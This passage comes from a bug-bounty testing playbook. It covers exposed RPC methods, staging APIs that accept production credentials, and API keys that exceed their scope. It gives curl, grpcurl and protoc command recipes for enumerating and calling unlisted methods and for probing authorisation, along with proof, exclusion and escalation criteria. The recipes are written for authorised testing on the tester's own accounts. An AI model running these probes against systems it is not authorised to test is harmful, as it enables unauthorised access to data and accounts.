| **Weakness** | Exposed Dangerous Method or Function · CWE-749 |
| **Prior art** | #876022, #138869, #3601469 |

- **Where:** the fact list has no tag for RPC transports, so the card runs on every API asset and settles itself in
  a few requests. Look for `application/grpc-web+proto`, `application/grpc-web-text` or `application/grpc`
  content types in the walk, paths shaped `/<package>.<Service>/<Method>`, generated stubs in the bundles
  (`*_grpc_web_pb.js`, `*ServiceClient`, protobufjs descriptors, `.proto` files in source maps), JSON-RPC bodies
  (`"jsonrpc":"2.0"`) on `/rpc`, `/jsonrpc`, `/api/rpc`, `/json-rpc` or a blockchain node URL, and XML-RPC on
  `/xmlrpc`, `/xmlrpc.php`, `/RPC2`.
- **Test:** an RPC server dispatches by method name, so every registered method is callable through the same
  endpoint, and authorisation often lives in the client's flow rather than in each method. List what the server
  will tell you (gRPC server reflection, JSON-RPC `rpc.discover` or `rpc_modules`, XML-RPC
  `system.listMethods`, the stubs in the bundles), subtract what the client calls, and call the rest with no
  session and with A's session, using empty arguments or A's own ids.
- **How:**
  ```bash
  D="$E/evidence/$H/API-013"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}'); CT='Content-Type: application/json'
  # 1. the client's own methods: gRPC-web paths and JSON-RPC method names in the bundles
  grep -rhoE '/[a-z][a-zA-Z0-9_]*(\.[a-zA-Z0-9_]+)+/[A-Z][A-Za-z0-9]+' "$E/recon/$H/js/" | sort -u > "$D/client-grpc.txt"
  grep -rhoE '"method" *: *"[A-Za-z0-9_.]+"|method: *"[A-Za-z0-9_.]+"' "$E/recon/$H/js/" | grep -oE '"[A-Za-z0-9_.]+"$' | tr -d '"' | sort -u > "$D/client-rpc.txt"
  # 2. what the server lists. Native gRPC reflection (grpcurl speaks gRPC over HTTP/2, not gRPC-web; pass the
  #    programme's headers with -H 'Name: value' and its User-Agent with -user-agent)
  grpcurl -max-time 10 "$H:443" list | tee "$D/grpc-services.txt"
  grpcurl -max-time 10 "$H:443" describe '<package.Service>' | tee "$D/grpc-describe.txt"
  for p in /rpc /jsonrpc /api/rpc /json-rpc /; do
    for m in rpc.discover rpc_modules system.listMethods; do
      curl -sS "${HDR[@]}" -X POST "$T$p" -H "$CT" -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"$m\",\"params\":[]}" \
        -o "$D/list$(echo "$p" | tr / _)-$m.json" -w "%{http_code} %{size_download} $p $m\n"; sleep "$W"; done; done
  curl -sS "${HDR[@]}" -X POST "$T/xmlrpc" -H 'Content-Type: text/xml' \
    -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>' -o "$D/xmlrpc-list.xml" -w 'xml-rpc %{http_code}\n'
  # 3. methods the server lists and the client never calls
  jq -r '.result.methods[]?.name // empty' "$D"/list*rpc.discover.json 2>/dev/null | sort -u | comm -13 "$D/client-rpc.txt" - | tee "$D/unlisted.txt"
  curl -sS "${HDR[@]}"    -X POST "$T/rpc" -H "$CT" -d '{"jsonrpc":"2.0","id":2,"method":"<unlisted method>","params":{}}'
  curl -sS "${HDR[@]}" $A -X POST "$T/rpc" -H "$CT" -d '{"jsonrpc":"2.0","id":3,"method":"<unlisted method>","params":{"id":"<A id>"}}'
  # 4. a gRPC-web unary call with curl: 5-byte frame (flag 0, big-endian length) and the message; an empty message is 0 bytes
  printf '\x00\x00\x00\x00\x00' | curl -sS "${HDR[@]}" -X POST "$T/<package.Service>/<Method>" \
    -H 'Content-Type: application/grpc-web+proto' -H 'X-Grpc-Web: 1' --data-binary @- -D "$D/grpcweb.hdr" -o "$D/grpcweb.bin"
  grep -ai 'grpc-status\|grpc-message' "$D/grpcweb.hdr" "$D/grpcweb.bin"; xxd "$D/grpcweb.bin" | head
  ```
  A message with fields: `protoc --encode=<package.Request> <file>.proto < req.txt > req.bin` with the `.proto`
  from `grpcurl describe` or the source maps, then prefix the 5-byte frame header
  (`python3 -c 'import sys,struct;b=sys.stdin.buffer.read();sys.stdout.buffer.write(b"\0"+struct.pack(">I",len(b))+b)' < req.bin`).
  Methods that sign, send, transfer, unlock or add peers (`personal_*`, `eth_sendTransaction`, `admin_addPeer`) are
  listed, never called.
- **Proof:** the method list (reflection output or the discovery response), the client's own method list showing
  the method is not among them, and the unlisted method's response with no session or with A's session carrying
  non-public data or confirming the action on our own object.
- **Not a finding when:** reflection, `rpc.discover` or `system.listMethods` answering is all there is: informative,
  like GraphQL introspection. The unlisted method returns `grpc-status` 7 (`PERMISSION_DENIED`) or 16
  (`UNAUTHENTICATED`), or JSON-RPC error `-32601` (method not found) or `-32600`. The methods of a public
  blockchain node that are public by design (`eth_blockNumber`, `eth_getBalance`). `xmlrpc.php` is enabled on
  WordPress: that is the default, and `system.multicall` login amplification is `rate-limit`.
- **Escalate:** a write or admin method that answers: prove it on our own object or with a no-op argument and stop.
  An RPC login that ignores an enforced SSO or 2FA (#138869, $7,000): the AUT chapter. Arguments that are ids:
  BAC-001 with B's ids. Arguments that are URLs: SSR-001. XML-RPC bodies are XML: XXE-006.

### API-014 · A staging, development or test API in scope serves production data or accepts production credentials

| | |
|---|---|
| **Severity** | High standalone when the non-production API returns production users' data or accepts production credentials with weaker controls; Medium for production configuration or internal records without personal data; Low for a copy with synthetic data |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | programme |
| **Cost** | medium |
| **Weakness** | Information Disclosure · CWE-668 |
| **Prior art** | #1392511, #953649, #1419205, #745171 |

- **Where:** once per programme, across every in-scope host whose name or content marks it as non-production:
  `staging`, `stage`, `stg`, `preprod`, `uat`, `qa`, `test`, `dev`, `sandbox`, `demo`, `canary` in a label,
  numbered or regional twins of the production API, hosts named in an API description's `servers`, in bundles
  (`STAGING_API_URL`), in CSP and CORS headers, in certificates found during recon. There is no fact for
  non-production hosts; the card is gated on our account because the proof needs one of our own production
  records as the marker.
- **Test:** non-production deployments are often restored from a copy of the production database, share the
  production identity provider or session store, or proxy to production services, while running debug builds,
  older code and fewer controls. Plant a marker in production on A, then look for it on the non-production API:
  with A's production session, after logging in there with A's production password, or as an older value of A's
  that only production ever held (a database copy).
- **How:**
  ```bash
  D="$E/evidence/@programme/API-014"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}'); CT='Content-Type: application/json'
  # 1. non-production API hosts: in-scope assets by name, plus hosts the bundles and descriptions point at, kept only if in scope
  scripts/sane asset list | awk 'NR > 2 {print $1}' | grep -iE '(^|[.-])(staging|stage|stg|preprod|pre-prod|uat|qa|test|dev|sandbox|demo|canary)([0-9]*[.-])' | tee "$D/nonprod-assets.txt"
  grep -rhoiE '[a-z0-9.-]*(staging|stage|stg|preprod|uat|qa|test|dev|sandbox)[a-z0-9.-]*\.[a-z]{2,}' "$E/recon/" 2>/dev/null | sort -u \
    | scripts/sane scope filter | tee "$D/nonprod-referenced.txt"
  P='https://<production API host>'; S='https://<non-production API host>'
  # 2. does it serve the same API? same routes and error shapes
  for u in /api/v1/me /api/v1/health /api/v1/version /api/v1/config; do
    printf '%-18s prod=%s  nonprod=%s\n' "$u" "$(curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code}/%{size_download}' "$P$u")" \
      "$(curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code}/%{size_download}' "$S$u")"; sleep "$W"; done | tee "$D/02-shape.txt"
  # 3. a production marker on A, then A's production session on the non-production host
  M="api014-$(date +%s)"; curl -sS "${HDR[@]}" $A -X PATCH "$P/api/v1/me" -H "$CT" -d "{\"bio\":\"$M\"}" -o /dev/null -w 'marker set in production %{http_code}\n'
  curl -sS "${HDR[@]}" $A "$S/api/v1/me" -o "$D/03-prod-session-on-nonprod.json" -w 'production session on non-production %{http_code}\n'
  grep -c "$M" "$D/03-prod-session-on-nonprod.json"
  # 4. A's production password on the non-production login, when the session itself is refused
  curl -sS "${HDR[@]}" -X POST "$S/api/v1/auth/login" -H "$CT" -d '{"email":"<A e-mail>","password":"<A production password>"}' -o "$D/04-login.json" -w 'login %{http_code}\n'
  # 5. a database copy instead of a live link: A's profile there shows an older production value and not today's marker
  jq -c '{email, bio, updated_at}' "$D/04-login.json" "$D/03-prod-session-on-nonprod.json" 2>/dev/null
  ```
  Collection sizes come from count fields; no record of a real user is saved.
- **Proof:** the in-scope non-production host serving our own production marker, our production session or our
  production password working there, or an older production value of our own account, next to the production
  request; plus the control that makes it worse than production (a missing 2FA step, a debug route, an open admin
  route) when one exists.
- **Not a finding when:** the host is out of scope or listed without a bounty: stop there. The data is synthetic or
  anonymised (our marker and our old values absent, only seeded users). The host is a public developer sandbox
  with its own sign-up: that is the product. The "staging" name is an alias of the production deployment (the
  same cluster in `scripts/sane asset list`). Sign-up on staging creates accounts there only.
- **Escalate:** test the non-production API like production, with its weaker controls: INF-006 and INF-007 for
  debug builds, API-003 on its own description, API-005 for its older code, BAC items with our accounts. A token
  issued by one environment and accepted by the other (shared signing key): JWT-010. Production secrets in its
  configuration: INF-002.

### API-015 · An API key or personal token performs an operation that its scope, its resource binding or its owner's account state forbids

| | |
|---|---|
| **Severity** | Medium standalone when a restricted key exceeds its scope on non-sensitive data; High when a read-only or single-resource key writes or reaches other resources, or when the key of a disabled, banned or removed account, or one that skips an enforced SSO, 2FA or IP allow-list, keeps working |
| **Requires** | api-keys, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Incorrect Authorization · CWE-863 |
| **Prior art** | #4000084, #118925, #2209433, #3572848 |

- **Where:** the product's key and token features: personal access tokens, API keys, app passwords, deploy keys,
  service accounts, tokens of an OAuth app we registered. The restrictions to test are the ones the creation form
  offers (scopes or permissions, read-only, binding to one project, index, repository or environment, expiry, an
  IP allow-list), the organisation policies that apply to members (enforced SSO, required 2FA, IP allow-list), and
  account states (suspended, banned, unverified, removed from the organisation).
- **Test:** a request that arrives with a key takes a different authentication path from the web session: a
  middleware resolves the key to a user and a scope list, and each route must check that list, while the
  account-state and organisation-policy checks live in the session login path and are not repeated. Create the
  narrowest key the product allows, call operations just outside it on our own resources, then change the
  owner's state on our own organisation and call again, on every router the key is accepted on (#4000084 was
  one REST router of two).
- **How:**
  ```bash
  D="$E/evidence/$H/API-015"; mkdir -p "$D"; CT='Content-Type: application/json'
  # 1. the narrowest key the form offers: read-only, bound to one of A's projects (the creation request is the template)
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/api-keys" -H "$CT" -d '{"name":"api015-ro","scopes":["projects:read"],"project_ids":["<A project 1>"]}' -o "$D/01-key.json"
  K=$(jq -r '.token // .key // .secret' "$D/01-key.json"); KH="Authorization: Bearer $K"
  # 2. inside the restriction (control), then just outside it, on A's own resources only
  curl -sS "${HDR[@]}" -H "$KH" "$T/api/v1/projects/<A project 1>" -o /dev/null -w 'read, bound project    %{http_code}\n'
  curl -sS "${HDR[@]}" -H "$KH" "$T/api/v1/projects/<A project 2>" -o /dev/null -w 'read, other project    %{http_code}\n'
  curl -sS "${HDR[@]}" -H "$KH" -X PATCH "$T/api/v1/projects/<A project 1>" -H "$CT" -d '{"description":"api015-write"}' -o /dev/null -w 'write, bound project   %{http_code}\n'
  curl -sS "${HDR[@]}" -H "$KH" "$T/api/v1/org/members" -o /dev/null -w 'other resource type    %{http_code}\n'
  curl -sS "${HDR[@]}" -H "$KH" -X POST "$T/api/v1/api-keys" -H "$CT" -d '{"name":"api015-child","scopes":["admin"]}' -o /dev/null -w 'mint a wider key       %{http_code}\n'
  curl -sS "${HDR[@]}" $A "$T/api/v1/projects/<A project 1>" | jq -r '.description'          # did the write land?
  # 3. every router that accepts the key: other versions, the export and GraphQL endpoints
  for pre in /api/v1 /api/v2 /rest /api/internal; do curl -sS "${HDR[@]}" -H "$KH" -o /dev/null -w "$pre %{http_code}\n" "$T$pre/projects/<A project 1>"; sleep 1; done
  # 4. after an owner-state change on our own organisation, the same read again (timestamps in the file names)
  curl -sS "${HDR[@]}" -H "$KH" "$T/api/v1/projects/<A project 1>" -o "$D/04-after-$(date -u +%H%M%S).json" -w 'after state change     %{http_code}\n'
  ```
  The state changes for step 4, each followed by step 4: A, as owner of its own organisation, enforces SSO,
  required 2FA, or an IP allow-list that excludes our address; with `priv-accounts`, our admin
  (`ADM="-H @$E/accounts/ADM.headers"`) suspends or removes A; A deactivates its own account where the product
  allows reactivation. Revoke every key and restore every policy afterwards; record them in `cleanup.md`.
- **Proof:** the creation request and response showing the scope and binding as stored, the refused control where
  one exists, the out-of-scope operation succeeding with the key, and its effect read back with A's session. For
  an account state or policy: the change as the admin view shows it, the web session refused, the key still
  working, with times.
- **Not a finding when:** the documentation says the scope is coarse (a read scope that lists other projects'
  names by design). The key belongs to an admin whose role covers the resource anyway and the binding is
  documented as a convenience. Access ends within minutes of suspension or revocation (`session-expiry`). The
  product documents that keys bypass SSO and offers a separate setting to block them: check whether it exists and
  was on. A write answers 200 and is not stored.
- **Escalate:** a key that outlives the owner's removal from the organisation: BAC-017. After revocation or a
  password change: AUT-017. Scopes granted at creation beyond the creator's role: BAC-014. Keys shipped in the
  front end: API-010.

## Graveyard

- **An exposed description or console.** A public Swagger UI, ReDoc page, `/openapi.json`, Postman collection,
  Django REST framework browsable API or FastAPI `/docs` with nothing in it that works without credentials.
  Closed informative; it is the map for API-003, not a report (#142569 and #1049733 were disclosed without a
  bounty). No exclusion tag.
- **Swagger UI's own injection bugs.** DOM XSS and HTML injection through `?url=` or `?configUrl=` in an outdated
  Swagger UI: the library holds eight Swagger UI reports and none was paid (#1736378, #2534300; #2174818 closed
  informative). `known-cve` where the version carries the advisory, `third-party` when a vendor hosts the docs.
- **"The API returns more fields than the page shows."** Internal ids, timestamps, feature flags, a Gravatar
  hash. Informative unless a field is private (INF-010) or enforces a rule (API-004).
- **The method list alone.** gRPC reflection, `rpc.discover` or `system.listMethods` answering, like GraphQL
  introspection.
- **"xmlrpc.php is enabled".** 39 reports in the library mention XML-RPC; the "enabled" reports mostly went
  unpaid and the rest paid $50 to $500 (#1212760, #1086850). `system.multicall` login amplification is
  `rate-limit`, pingback abuse is `dos`. The one large payout (#138869) was a login that skipped SSO: API-013.
- **Vendor keys designed to be public.** Maps, Firebase web config, Sentry DSN, Stripe publishable and Algolia
  search-only keys belong to INF-004. About half of the disclosed Google Maps key reports paid $150 to $750
  (#3250315, #1093667) and the rest nothing.
- **A version as the finding.** "/v1 still answers" or "the deprecated API is reachable" without a control it
  skips. Informative.
- **Big or unbounded page sizes** on data the caller may read: `dos` when claimed as availability, `rate-limit`
  when claimed as scraping.
- **CSRF on JSON endpoints that change nothing sensitive** (`csrf-low`), and curl-only CSRF that no browser
  would send.
- **Missing rate limits on API routes** (`rate-limit`), including "the old version has no rate limit".
- **Webhooks without a consequence.** A missing HMAC check in a sample or reference app (#3697491, closed
  informative), an outbound webhook without a signature header, a receiver that acknowledges with 200 and
  re-fetches the event from the provider.
- **Type juggling that only produces a 500 or a stack trace** (`version-disclosure`; `dos` when claimed as
  availability).
- **Parameter pollution without a consequence.** A duplicate that changes text in a share link or an iframe
  (`content-spoofing`).
- **Non-production hosts out of scope or holding synthetic data.** N/A, however much the host shows.
- **Mass assignment of harmless fields.** Our own `created_at`, `avatar_url` or display flags, or a role label
  that grants nothing.
- **Scanner output** from OpenAPI fuzzers or key scanners without a manual proof (`automated`).

## Chains

- API-003 → API-001, API-002 (`readOnly` properties are the attribute list), BAC-011 (operations tagged admin or
  internal, with A's low-privilege session), API-014 (`servers` that name staging hosts).
- API-010 → API-003, BAC-011: the key's routes are new surface. User-created keys: API-015.
- API-005 → BAC-013 (authorisation on the old surface), API-001 (the old serializer's allow-list), INF-010 (the
  old field filter).
- API-001 → BIZ-001, BIZ-008, BIZ-011, BIZ-012, BIZ-014, AUT-014, BAC-014: the bound attribute is the tamper.
- API-002 (membership) → every BAC item, run from inside B's tenant.
- API-007 → API-001 (attribute deny-lists), BAC-002 (ownership checks), API-012 (a signature over the first
  copy), the OAU chapter (redirect-host checks).
- API-008 → AUT items (a backend field holding B's reset token), BAC-011 at the backend.
- API-006 → the CSR chapter; GQL-008 is the GraphQL form. A validator that parses only JSON lets API-001's refused
  attributes through as form fields.
- API-009 → AUT-005, AUT-008 (codes), AUT-003 (address arrays), BAC-002 (ids sent as arrays), the NSQ chapter
  (object values in lookups).
- API-011 → BAC-009 (search and expansion), BAC-006 (a tenant id inside the cursor), the SQL and NSQ chapters
  (wildcards).
- API-012 → BIZ-007 (completion without payment), the SQL chapter (#894325: the injection behind the signature).
- API-013 → the AUT chapter (an RPC login that skips SSO or 2FA), BAC-001 (ids in arguments), SSR-001 (URL
  arguments), XXE-006 (XML-RPC).
- API-014 → INF-006, INF-007 (debug builds), JWT-010 (a token signed for staging accepted by production),
  API-003 on its own description.
- API-015 → AUT-017 (revocation), BAC-017 (removal), BAC-014 (scopes beyond the creator's role).
- GQL-006 → API-001, API-002: hidden input fields of mutations are the same attributes.

## Sources

- `kb/reports/api.md` and `kb/reports/all/api.md`: the disclosed reports this chapter is built from.
  `docs/07-graveyard.md` has the cross-class closures; `docs/04-evidence-standard.md` the rule for third-party
  data that appears in a response.
- HexBrain: `get_testing_playbook {"topic":"Mass Assignment"}`, `get_testing_playbook {"topic":"API Security"}`,
  `find_payloads {"topic":"HTTP Parameter Pollution"}`, `find_bypasses {"protection":"webhook signature"}`.
- OWASP API Security Top 10 2023: API3, API8, API9, API10; OWASP Mass Assignment Cheat Sheet; OWASP WSTG-INPV-04
  (testing for HTTP parameter pollution).
- PortSwigger Web Security Academy, API testing (mass assignment, server-side parameter pollution).
- PayloadsAllTheThings: Mass Assignment, HTTP Parameter Pollution, Type Juggling, API Key Leaks.
- Luca Carettoni and Stefano di Paola, "HTTP Parameter Pollution" (OWASP AppSec Europe 2009); Bishop Fox, "An
  Exploration of JSON Interoperability Vulnerabilities" (2021).
- The gRPC server reflection protocol and `grpcurl`; the OpenRPC `rpc.discover` method; the webhook signature
  documentation of Stripe, GitHub, Shopify, Slack, Twilio and PayPal.
